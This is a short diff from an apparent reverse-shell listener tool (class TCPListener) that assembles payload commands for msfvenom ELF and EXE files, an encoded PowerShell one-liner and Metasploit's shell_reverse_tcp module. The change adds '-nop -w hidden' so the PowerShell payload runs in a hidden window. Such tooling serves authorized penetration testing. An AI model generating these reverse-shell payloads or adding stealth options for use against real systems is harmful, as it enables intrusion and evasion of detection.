@@ -2469,7 +2469,7 @@ class TCPListener:
 				blocks.append(("Msfvenom ELF", presets["msfvenom_elf"].format(ip, port)))
 			if target_os in ('windows', 'both'):
 				blocks.append(("Powershell",
-					"cmd /c powershell -e " + base64.b64encode(presets["powershell"].format(ip, port).encode("utf-16le")).decode()))
+					"cmd /c powershell -nop -w hidden -e " + base64.b64encode(presets["powershell"].format(ip, port).encode("utf-16le")).decode()))
 				blocks.append(("Msfvenom EXE", presets["msfvenom_exe"].format(ip, port)))
 			blocks.append(("Metasploit", "\n".join((
 				"set PAYLOAD generic/shell_reverse_tcp",
